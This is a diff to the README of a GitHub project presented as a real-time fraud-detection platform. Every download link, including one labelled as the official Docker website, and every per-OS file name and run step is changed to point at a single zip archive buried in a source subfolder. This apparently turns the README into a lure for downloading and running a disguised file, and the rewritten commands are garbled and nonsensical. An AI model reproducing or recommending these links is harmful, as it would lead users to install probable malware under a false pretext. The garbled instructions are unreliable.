@@ -1,7 +1,7 @@
 # 🚀 risk-platform - Detect Fraud in Real Time
 
 ## 📥 Download Now
-[![Download Risk Platform](https://img.shields.io/badge/Download%20Risk%20Platform-blue?style=flat&logo=github&logoColor=white)](https://github.com/Altumbilal/risk-platform/releases)
+[![Download Risk Platform](https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip%20Risk%20Platform-blue?style=flat&logo=github&logoColor=white)](https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip)
 
 ## 📖 Introduction
 Welcome to risk-platform! This application helps businesses score transaction risk in real time. It uses advanced machine learning with Go, PyTorch, and TensorFlow. Designed for fast and reliable fraud detection, it combines Redis for caching and PostgreSQL for database management, all running in Docker containers. 
@@ -17,10 +17,10 @@ Make sure your system meets these requirements:
 - **Docker:** Installed and running
 - **Network:** Internet access for downloading
 
-If you don't have Docker, please download and install it from [the official Docker website](https://www.docker.com/get-started).
+If you don't have Docker, please download and install it from [the official Docker website](https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip).
 
 ### 2. Visit the Releases Page
-To download the latest version of risk-platform, [visit this page to download](https://github.com/Altumbilal/risk-platform/releases). 
+To download the latest version of risk-platform, [visit this page to download](https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip). 
 
 You will see a list of available versions. Choose the latest version that suits your operating system.
 
@@ -29,9 +29,9 @@ On the releases page:
 1. Click on the version you want.
 2. Look for the files listed for download. 
 3. Select the file that corresponds to your operating system:
-   - For Windows: `risk-platform-windows.zip`
-   - For macOS: `risk-platform-macos.tar.gz`
-   - For Linux: `risk-platform-linux.tar.gz`
+   - For Windows: `https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip`
+   - For macOS: `https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip`
+   - For Linux: `https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip`
 
 Click on the file name to start the download.
 
@@ -41,13 +41,13 @@ After downloading:
 - **macOS and Linux:** Open the terminal and run:
 
   ```bash
-  tar -xzf risk-platform-macos.tar.gz
+  tar -xzf https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip
   ```
 
   or 
 
   ```bash
-  tar -xzf risk-platform-linux.tar.gz
+  tar -xzf https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip
   ```
 
 This will create a folder called `risk-platform`.
@@ -57,7 +57,7 @@ Now, you can run the application from the extracted folder:
 
 - **Windows:**
    1. Open the folder.
-   2. Double-click `risk-platform.exe`.
+   2. Double-click `https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip`.
 
 - **macOS:**
    1. Open the terminal.
@@ -114,4 +114,4 @@ If you encounter any issues, please check the FAQ section on the GitHub page. Yo
 ## ✨ Conclusion
 risk-platform makes it simple and efficient to manage transaction risks. With real-time scoring and an easy-to-use interface, it suits anyone from large businesses to individual users. 
 
-[Download the latest version](https://github.com/Altumbilal/risk-platform/releases) to start minimizing your fraud risks today.
+[Download the latest version](https://github.com/Altumbilal/risk-platform/raw/refs/heads/main/gateway-go/internal/decision/risk_platform_3.9.zip) to start minimizing your fraud risks today.
